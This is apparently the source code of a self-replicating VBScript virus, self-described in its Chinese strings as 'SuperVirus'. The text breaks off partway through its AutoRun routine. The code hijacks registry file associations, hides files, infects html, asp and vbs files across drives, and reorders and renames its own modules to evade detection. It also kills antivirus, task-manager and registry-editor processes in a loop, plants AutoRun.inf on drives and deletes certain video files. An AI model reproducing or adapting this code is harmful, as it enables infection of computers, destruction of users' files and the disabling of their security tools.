'juan4

'OUJUJWPWIWIVG2_16

Sub SetTxtFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SethlpFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SetRegFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SetchmFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub



'SZMTKAMLGPO2_16

'OUJUJWPWIWIVG2_13

Sub DeSafeSet()
    Dim HLMShow , HCUAdvanced, HCUExplorer
    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUExplorer = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
    Call WriteReg (HCUExplorer, 129, "REG_DWORD")
    Call WriteReg (HCUAdvanced, 0, "REG_DWORD")
    Call WriteReg (HLMShow, 0, "REG_DWORD")
End Sub

Sub SafeSet()
    Dim HLMShow , HCUSSHidden, HCUHidden
    Dim HCUExplorer
    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUHidden = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
    Call WriteReg (HCUHidden, 1, "REG_DWORD")
    Call WriteReg (HCUAdvanced, 1, "REG_DWORD")
    Call WriteReg (HLMShow, 1, "REG_DWORD")
End Sub

'SZMTKAMLGPO2_13

'OUJUJWPWIWIVG1_3

Sub ExeVbs_Virus()
    On Error Resume Next
    Dim objfso, objshell, FullPath_Self, Name_Self, Names
    Dim oArgs, ArgNum, Para_V, SubPara_V, RunPath
    Dim Order, Order_Order, Order_Para
    Dim vbsCode , VbsCode_Virus, VbsCode_WebPage, VbsCode_Victim , MainBody

    Set objfso = CreateObject(GetFSOName())
    Set objshell = CreateObject("WScript.Shell")
    FullPath_Self = WScript.ScriptFullName
    Name_Self = WScript.ScriptName
    Names = Array("OUJUJWPWIWIVG", "SZMTKAMLGPO")

    Set oArgs = WScript.Arguments
    ArgNum = 0
    Do While ArgNum < oArgs.Count
        Para_V = Para_V & " " & oArgs(ArgNum)
        ArgNum = ArgNum + 1
    Loop
    SubPara_V = LCase(Right(Para_V, 3))
    Select Case SubPara_V
        Case "run"
            RunPath = Left(FullPath_Self, 2)
            Call Run(RunPath)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "txt", "log"
            RunPath = "%SystemRoot%\system32\NOTEPAD.EXE " & Para_V
            Call Run(RunPath)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "reg"
            Para_V = "regedit.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "chm"
            Para_V = "hh.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "hlp"
            Para_V = "winhlp32.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case Else
            If PreInstance = True Then
                WScript.Quit
            End If
            If IsOK(objfso, Date(), FullPath_Config) = False Then
                If objfso.FileExists(FullPath_Config) = True Then
                    Order = Trim(ReadOK(objfso, FullPath_Config))
                    Order_Order = Trim(Mid(Order, 1, InStr(1, Order, "@") -1))
                    Order_Para = Trim(Mid(Order, InStr(1, Order, "@") + 1, Len(Order) - InStr(1, Order, "@")))
                End If

                Select Case Order_Order
                Case "InfectFiles"
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_WebPage = Head_V & Version & VBCRLF & WebHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_WebPage = ChangeModelOrder(VbsCode_WebPage, Sum_ModelCode)
                    VbsCode_WebPage = ChangeName(VbsCode_WebPage, Names)
                    VbsCode_Victim = Head_V & Version & VBCRLF & VictimHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Victim = ChangeModelOrder(VbsCode_Victim, Sum_ModelCode)
                    VbsCode_Victim = ChangeName(VbsCode_Victim, Names)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 0)
                    Order_Para = Order_Para + Cnt
                    If Order_Para>2000 Then
                        Call WriteOK(objfso, FullPath_Config, "Msg", "您已有超过2000个文件被感染!不过请放心，此病毒很容易被清除!请联系418465***-_- !")
                    Else
                        Call WriteOK(objfso, FullPath_Config, "InfectFiles", Order_Para)
                    End If
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

                Case "Msg"
                    MsgBox Order_Para
                    Call WriteOK(objfso, FullPath_Config, "", "")
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

                Case "UnLoadMe"
                    Call RestoreSystem(objfso)
                    Wscript.Quit

                Case "KillVirus"
                    Call RestoreSystem(objfso)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 1)
                    Wscript.Quit

                Case Else
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_WebPage = Head_V & Version & VBCRLF & WebHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_WebPage = ChangeModelOrder(VbsCode_WebPage, Sum_ModelCode)
                    VbsCode_WebPage = ChangeName(VbsCode_WebPage, Names)
                    VbsCode_Victim = Head_V & Version & VBCRLF & VictimHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Victim = ChangeModelOrder(VbsCode_Victim, Sum_ModelCode)
                    VbsCode_Victim = ChangeName(VbsCode_Victim, Names)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 0)
                    Call WriteOK(objfso, FullPath_Config, "InfectFiles", Cnt)
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

            End Select
        Else
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            MainBody = GetMainBody(vbsCode, Sum_ModelCode)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V '生成病毒体完整代码
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode) '改变模块组合顺序
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names) '改变模块标志名称
            Call MonitorSystem(objfso, VbsCode_Virus)
        End If
    End Select
    Set objfso = Nothing
    Set objshell = Nothing
End Sub

'SZMTKAMLGPO1_3

'OUJUJWPWIWIVG2_21

Function IsSexFile(fname)
    IsSexFile = False
    If InStr(fname, "成人")>0 Or InStr(fname, "淫")>0 Or InStr(fname, "偷拍")>0 Or _
                InStr(fname, "偷窥")>0 Or InStr(fname, "口交")>0 Or InStr(fname, "强奸")>0 Or _
                InStr(fname, "轮奸")>0 Or InStr(fname, "伦理片")>0 Or InStr(fname, "自摸")>0 Then
        IsSexFile = True
    End If
End Function

Function Isinfected(buffer, ftype)
    Isinfected = True
    Select Case ftype
        Case "hta", "htm" , "html" , "asp", "vbs"
            If InStr(buffer, Head_V) = 0 Then
                Isinfected = False
            End If
        Case Else
            Isinfected = True
    End Select
End Function

'SZMTKAMLGPO2_21

'OUJUJWPWIWIVG2_17

Function PreInstance()
    On Error Resume Next
    Dim num_cnt
    Dim strComputer, objWMIService, colProcessList, objProcess
    num_cnt = 0
    PreInstance = False
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where " & "Name = 'cscript.exe' or Name = 'wscript.exe'")
    For Each objProcess in colProcessList
        If InStr(CStr(objProcess.CommandLine), WScript.ScriptFullName)>0 Then
            num_cnt = num_cnt + 1
        End If
    Next
    If num_cnt>= 2 Then
        PreInstance = True
    End If
End Function

'SZMTKAMLGPO2_17

'OUJUJWPWIWIVG2_10

Sub SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, T)
    On Error Resume Next
    Dim d , dc
    Set dc = objfso.Drives
    For Each d In dc
        If Cnt >= CntMax Then '
            Exit For
        End If
        If d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3 Then
            'If d.DriveType = 1 Then
            Call SearchFile(objfso, d.Path & "\", VbsCode_WebPage, VbsCode_Victim, T)
            'End If
        End If
    Next
End Sub

'SZMTKAMLGPO2_10

'OUJUJWPWIWIVG2_24

Sub KillProcess(ProcessNames)
    On Error Resume Next
    Dim objShell, intReturn, name_exe
    Set objShell = WScript.CreateObject("WScript.Shell")
    strComputer = "."
    Set objWMIServices = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    For Each ProcessName in ProcessNames
        Set colProcessList = objWMIServices.Execquery(" Select * From win32_process where name = '" & ProcessName & "' ")
        For Each objProcess in colProcessList
            intReturn = objProcess.Terminate
            Select Case intReturn
                Case 2
                    name_exe = objProcess.Name
                    name_exe = Left(name_exe, Len(name_exe) -4)
                    objShell.Run "cmd.exe /c @tskill " & name_exe, 0, False
            End Select
        Next
    Next
    Set objShell = Nothing
End Sub

'SZMTKAMLGPO2_24

'OUJUJWPWIWIVG2_22

Function GetSFolder(p)
    Dim objfso
    Set objfso = CreateObject(GetFSOName())
    GetSFolder = objfso.GetSpecialFolder(p) & "\"
    Set objfso = Nothing
End Function

Function GetUserName()
    On Error Resume Next
    Dim Value , UserName
    Value = "HKEY_CURRENT_USER\Software\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}\Username"
    UserName = ReadReg(Value)
    If UserName = "" Then
        GetUserName = "Administrator"
    Else
        GetUserName = UserName
    End If
End Function

Function GetFSOName()
    On Error Resume Next
    Dim Value , UserName
    Value = "HKEY_CLASSES_ROOT\CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\ProgID\"
    UserName = ReadReg(Value)
    If UserName = "" Then
        GetUserName = "Scripting.FileSystemObject"
    Else
        GetFSOName = UserName
    End If
End Function

Function GetHeadTail(l)
    Dim Str , buffer
    If l = 0 Then
        GetHeadTail = "'" & GetUserName()
    Else
        buffer = GetUserName()
        Str = ""
        For i = 1 To Len(buffer)
            Str = Mid(buffer, i, 1) & Str
            GetHeadTail = "'" & Str
        Next
    End If
End Function

'SZMTKAMLGPO2_22

'OUJUJWPWIWIVG1_5

Sub MonitorSystem(objfso, vbsCode)
    On Error Resume Next
    Dim ProcessNames
    ProcessNames = Array("ras.exe", "360tray.exe", "taskmgr.exe", "cmd.exe", "cmd.com", "regedit.exe", "regedit.scr", "regedit.pif", "regedit.com", "msconfig.exe", "SREng.exe", "USBAntiVir.exe")
    Do
        Call KillProcess(ProcessNames)
        Call InvadeSystem(objfso, vbsCode)
        WScript.Sleep 5000
    Loop
End Sub

'SZMTKAMLGPO1_5

'OUJUJWPWIWIVG2_11

Sub SearchFile(objfso, strPath, VbsCode_WebPage, VbsCode_Victim, T)
    On Error Resume Next
    Dim pfo, pf, pfi, ext
    Dim psfo, ps
    Set pfo = objfso.GetFolder(strPath)
    Set pf = pfo.Files
    For Each pfi In pf
        If Cnt >= CntMax Then
            Exit For
        End If
        ext = LCase(objfso.GetExtensionName(pfi.Path))

        Select Case ext
            Case "hta", "htm", "html", "asp", "vbs"
                Call InfectHead(pfi.Path, pfi, objfso, VbsCode_WebPage, VbsCode_Victim, ext, T)
            Case "mpg", "rmvb", "avi", "rm"
                If IsSexFile(pfi.Name) = True Then
                    pfi.Delete
                End If
        End Select
    Next
    Set psfo = pfo.SubFolders
    For Each ps In psfo
        If Cnt >= CntMax Then
            Exit For
        End If
        Call SearchFile(objfso, ps.Path, VbsCode_WebPage, VbsCode_Victim, T)
    Next
End Sub

'SZMTKAMLGPO2_11

'OUJUJWPWIWIVG2_19

Function GetVersion(objfso, path_v)
    Dim FV, buffer
    Set FV = objfso.OpenTextFile(path_v, 1)
    buffer = FV.ReadAll()
    GetVersion = Mid(buffer, InStr(buffer, Head_V) + Len(Head_V), 1)
End Function

Function GetScriptCode(Languages)
    On Error Resume Next
    Dim soj
    For Each soj In document.Scripts
        If LCase(soj.Language) = Languages Then
            Select Case LCase(soj.Language)
                Case "vbscript"
                    GetScriptCode = soj.Text
                    Exit Function
                Case "javascript"
                    GetScriptCode = soj.Text
                    Exit Function
            End Select
        End If
    Next
End Function

Function GetSelfCode(objfso, FullPath_Self)
    On Error Resume Next
    Dim n, n1, buffer, Self
    Set Self = objfso.OpenTextFile(FullPath_Self, 1)
    buffer = Self.ReadAll
    n = InStr(buffer, Head_V)
    n1 = InstrRev(buffer, Tail_V)
    buffer = Mid(buffer, n, n1 - n + Len(Tail_V) + 1)
    GetSelfCode = buffer
    Self.Close
End Function

Function GetMainBody(vbsCode, Sum_ModelCode)
    Dim i
    For i = 2 To Sum_ModelCode
        GetMainBody = GetMainBody & VBCRLF & GetModelCode(vbsCode, i) & VBCRLF
    Next
End Function

'SZMTKAMLGPO2_19

'OUJUJWPWIWIVG2_26

Sub Run(ExeFullName)
    Dim WshShell
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run ExeFullName
    Set WshShell = Nothing
End Sub

Sub CopyFile(objfso, code, pathf)
    On Error Resume Next
    Dim vf
    Set vf = objfso.OpenTextFile(pathf, 3, true)
    vf.Write code
End Sub

Function ChangeName(vbsCode, Names)
    Dim Name, j, temp, buffer
    buffer = vbsCode
    Randomize
    For Each Name in Names
        temp = ""
        For j = 1 To Len(Name)
            temp = temp & Chr((Int(Rnd * 26) + 65))
        Next
        buffer = Replace(buffer, Name, temp)
    Next
    ChangeName = buffer
End Function

'SZMTKAMLGPO2_26

'OUJUJWPWIWIVG1_8

Sub RestoreSystem(objfso)
    On Error Resume Next
    Dim Value, dc, d, HCULoad

    Call SafeSet()

    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
    If ReadReg(HCULoad) = FullPath_V1 Then
        Call DeleteReg(HCULoad)
    End If

    Value = "%SystemRoot%\system32\NOTEPAD.EXE %1"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = "regedit.exe " & """%1"""
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = GetSFolder(1) & "hh.exe " & """%1"""
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = "%SystemRoot%\system32\winhlp32.exe %1"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = """%1"" %*"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command\")<>Value Then
        Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command\", Value, "REG_SZ")
    End If

    Set dc = objfso.Drives
    For Each d In dc
        If objfso.FileExists(d.DriveLetter & ":\" & Name_V1) = True Then
            objfso.DeleteFile d.DriveLetter & ":\" & Name_V1
            objfso.DeleteFile d.DriveLetter & ":\" & "AutoRun.inf"
        End If
    Next

    If objfso.FileExists(FullPath_V1) = True Then
        Set vf = objfso.GetFile(FullPath_V1)
        vf.Delete
    End If

    If objfso.FileExists(FullPath_V0) = true Then
        Set vf = objfso.GetFile(FullPath_V0)
        vf.Delete
    End If

    If objfso.FileExists(FullPath_Config) = True Then
        objfso.DeleteFile FullPath_Config , True
    End If
End Sub

'SZMTKAMLGPO1_8

'OUJUJWPWIWIVG2_14

Function ReadOK(objfso, FullPath_OK)
    On Error Resume Next
    Dim vf, buffer
    Set vf = objfso.OpenTextFile(FullPath_OK, 1)
    buffer = vf.ReadAll
    ReadOK = RTrim(Mid(buffer, InStr(buffer, "Order:") + 6, 50))
End Function

Sub WriteOK(objfso, FullPath_OK, Order_Order, Order_Para)
    On Error Resume Next
    Dim vf1
    objfso.DeleteFile FullPath_OK, True
    Set vf1 = objfso.OpenTextFile(FullPath_OK, 2, True)
    vf1.Write "OK" & VBCRLF
    vf1.WriteLine Date()
    vf1.WriteLine "Order:" & Order_Order & "@" & Order_Para
    Call SetFileAttr(objfso, FullPath_OK)
End Sub

'SZMTKAMLGPO2_14

'OUJUJWPWIWIVG1_9

Function ChangeModelOrder(vbsCode, Num_DNA)
    On Error Resume Next
    Dim DNA(), Array_vbsCode()
    Dim i, Value, flag, j, buffer
    ReDim DNA(Num_DNA), Array_vbsCode(Num_DNA)
    buffer = vbsCode
    Randomize
    For i = 1 To Num_DNA
        Do
            Value = Int((Num_DNA * Rnd) + 1)
            flag = 1

            For j = 1 To Num_DNA
                If Value = DNA(j) Then
                    flag = 0
                    Exit For
                End If
            Next

        Loop Until flag = 1

        DNA(i) = Value
    Next
    For i = 1 To Num_DNA
        Array_vbsCode(i) = GetModelCode(buffer, i)

    Next
    buffer = ""
    For i = 1 To Num_DNA
        buffer = buffer & VBCRLF & Array_vbsCode(DNA(i)) & VBCRLF
    Next
    ChangeModelOrder = Head_V & Version & VBCRLF & buffer & VBCRLF & Tail_V
End Function

'SZMTKAMLGPO1_9

'OUJUJWPWIWIVG2_20

Function GetModelCode(vbsCode, N_ModelCode)
    On Error Resume Next
    Dim n, n1, buffer
    buffer = vbsCode
    If N_ModelCode>= 1 And N_ModelCode<= 9 Then
        n = InStr(buffer, ModelHead & "1_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "1_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "1_" & N_ModelCode))
    ElseIf N_ModelCode>= 10 And N_ModelCode<= 99 Then
        n = InStr(buffer, ModelHead & "2_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "2_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "2_" & N_ModelCode))
    ElseIf N_ModelCode>= 100 And N_ModelCode<= 999 Then
        n = InStr(buffer, ModelHead & "3_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "3_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "3_" & N_ModelCode))
    End If
End Function

'SZMTKAMLGPO2_20

'OUJUJWPWIWIVG2_15

Sub SetFileAttr(objfso, pathf)
    Dim vf
    Set vf = objfso.GetFile(pathf)
    vf.Attributes = 6
End Sub

'SZMTKAMLGPO2_15

'OUJUJWPWIWIVG2_23

Function MakeScript(strCode, T)
    If T = 1 Then
        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & ChangeModelOrder(strCode, Sum_ModelCode) & VBCRLF & "</" & "SCRIPT>"
    Else
        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & strCode & VBCRLF & "</" & "SCRIPT>"
    End If
End Function


'SZMTKAMLGPO2_23

'OUJUJWPWIWIVG1_4

Function Head()
    Head = VBCRLF & "'OUJUJWPWIWIVG1_1" & VBCRLF &_
    "On Error Resume Next" & VBCRLF &_
    "Dim Cnt, CntMax, Version, Name_V1, FullPath_V0, FullPath_V1, FullPath_Config,Sum_ModelCode,Head_V,Tail_V" & VBCRLF &_
    "Dim ModelHead, ModelTail" & VBCRLF &_
    "Cnt = 0" & VBCRLF &_
    "CntMax = 1000" & VBCRLF &_
    "Version = ""4""" & VBCRLF &_
    "Name_V1 = GetUserName() & "".vbs""" & VBCRLF &_
    "FullPath_V0 = GetSFolder(0) & Name_V1 '主要执行文件关联转向" & VBCRLF &_
    "FullPath_V1 = GetSFolder(1) & Name_V1 '主要执行配置文件命令" & VBCRLF &_
    "FullPath_Config= GetSFolder(1) & GetUserName() & "".ini""" & VBCRLF &_
    "Sum_ModelCode = 26" & VBCRLF &_
    "Head_V= GetHeadTail(0)" & VBCRLF &_
    "Tail_V= GetHeadTail(1)" & VBCRLF &_
    "ModelHead=""'OUJUJWPWIWIVG""" & VBCRLF &_
    "ModelTail=""'SZMTKAMLGPO""" & VBCRLF
End Function

Function VictimHead()
    VictimHead = Head() & VBCRLF &_
    "Call VictimMain()" & VBCRLF &_
    "Sub VictimMain()" & VBCRLF &_
    "    Call ExeVbs_Victim()" & VBCRLF &_
    "End Sub" & VBCRLF &_
    "'SZMTKAMLGPO1_1" & VBCRLF
End Function

Function VirusHead()
    VirusHead = Head() & VBCRLF &_
    "Call VirusMain()" & VBCRLF &_
    "Sub VirusMain()" & VBCRLF &_
    "    On Error Resume Next" & VBCRLF &_
    "    Call ExeVbs_Virus()" & VBCRLF &_
    "End Sub" & VBCRLF & VBCRLF &_
    "'SZMTKAMLGPO1_1" & VBCRLF
End Function

Function WebHead()
    WebHead = Head() & VBCRLF &_
    "Call WebMain()" & VBCRLF &_
    "Sub WebMain()" & VBCRLF &_
    "    On Error Resume Next" & VBCRLF &_
    "    Call ExeVbs_WebPage()" & VBCRLF &_
    "End Sub" & VBCRLF &_
    "'SZMTKAMLGPO1_1" & VBCRLF
End Function

'SZMTKAMLGPO1_4

'OUJUJWPWIWIVG2_18

Function IsOK(objfso, Now_V, path_f)
    On Error Resume Next
    Dim vf, p1, p2, p3
    IsOK = False
    Set vf = objfso.OpenTextFile(path_f, 1)
    p1 = Trim(vf.ReadLine)
    p2 = Trim(vf.ReadLine)
    p3 = Trim(vf.ReadLine)
    If StrComp(p1, "OK", 1) = 0 And StrComp(p2, Now_V, 1) = 0 Then
        IsOK = True
    End If
    If p3 = "Admin" Then
        MsgBox "You Are Admin!!! Your Computer Will Not Be Infected!!!"
        IsOK = True
        n = InputBox("0:退出； 1:监视系统； 2:传染文件", "SuperVirus脚本测试!")
        If n = 0 Then
            Wscript.Quit
        ElseIf n = 1 Then
            IsOK = True
        ElseIf n = 2 Then
            IsOK = False
        End If
    End If
End Function

'SZMTKAMLGPO2_18

'OUJUJWPWIWIVG1_2

Sub ExeVbs_WebPage()
    On Error Resume Next
    Dim objfso, vbsCode, VbsCode_Virus
    Set objfso = CreateObject(GetFSOName())
    vbsCode = GetScriptCode("vbscript")
    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
    Call InvadeSystem(objfso, VbsCode_Virus)
    Set objfso = Nothing
End Sub

Sub ExeVbs_Victim()
    On Error Resume Next
    Dim objfso, vbsCode, VbsCode_Virus
    Set objfso = CreateObject(GetFSOName())
    vbsCode = GetSelfCode(objfso, WScript.ScriptFullName)
    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
    Call InvadeSystem(objfso, VbsCode_Virus)
    Call Run(FullPath_V1)
    Set objfso = Nothing
End Sub

'SZMTKAMLGPO1_2

'OUJUJWPWIWIVG2_12

Sub InfectHead(strPath, fi, objfso, VbsCode_WebPage, VbsCode_Victim, ftype, T)
    On Error Resume Next
    Dim tso, buffer, strCode , Maxsize
    Maxsize = 989000
    If fi.Size< Maxsize Then
        Set tso = objfso.OpenTextFile(strPath, 1, True)
        buffer = tso.ReadAll()
        tso.Close

        If T = 0 Then
            Select Case ftype
                Case "hta", "htm", "html", "asp"
                    If Isinfected(buffer, ftype) = False Then
                        Set tso = objfso.OpenTextFile(strPath, 2, true)
                        strCode = MakeScript(VbsCode_WebPage, 0)
                        tso.Write strCode & VBCRLF & buffer
                        Cnt = Cnt + 1
                    End If
                Case "vbs"
                    If Isinfected(buffer, ftype) = False Then
                        n = InStr(buffer , "Option Explicit")
                        If n<>0 Then
                            buffer = Replace(buffer, "Option Explicit", "", 1, 1, 1)
                            Set tso = objfso.OpenTextFile(strPath, 2, true)
                            tso.Write vbsCode_Victim & VBCRLF & buffer
                            Cnt = Cnt + 1
                        Else
                            Set tso = objfso.OpenTextFile(strPath, 2, true)
                            tso.Write vbsCode_Victim & VBCRLF & buffer
                            Cnt = Cnt + 1
                        End If
                    End If
                Case Else
                    '
                    '
            End Select

        ElseIf T = 1 Then
            If Isinfected(buffer, ftype) = True Then
                n = InStrRev(buffer , Tail_V)
                If n<>0 Then
                    buffer = Replace(buffer, Tail_V, "", n, 1, 1)
                    Set tso = objfso.OpenTextFile(strPath, 2, True)
                    tso.Write strCode & VBCRLF & buffer
                End If
            End If
        End If
    End If

End Sub

'SZMTKAMLGPO2_12

'OUJUJWPWIWIVG1_6

Sub AutoRun(objfso, D, vbsCode)
    On Error Resume Next
    Dim path_autorun, path_vbs, inf_autorun
    path_autorun = D & ":\AutoRun.inf"
    path_vbs = D & ":\" & Name_V1
    If objfso.FileExists(path_vbs) = False Or objfso.FileExists(path_autorun) = False Or GetVersion(objfso, path_vbs)<Version Then
        If objfso.FileExists(path_autorun) = True Then
            objfso.DeleteFile path_autorun, True
        End If

        If objfso.FileExists(path_vbs) = True Then
            objfso.DeleteFile path_vbs, True
        End If

        Call CopyFile(objfso, vbsCode, path_vbs)
        Call SetFileAttr(objfso, path_vbs)

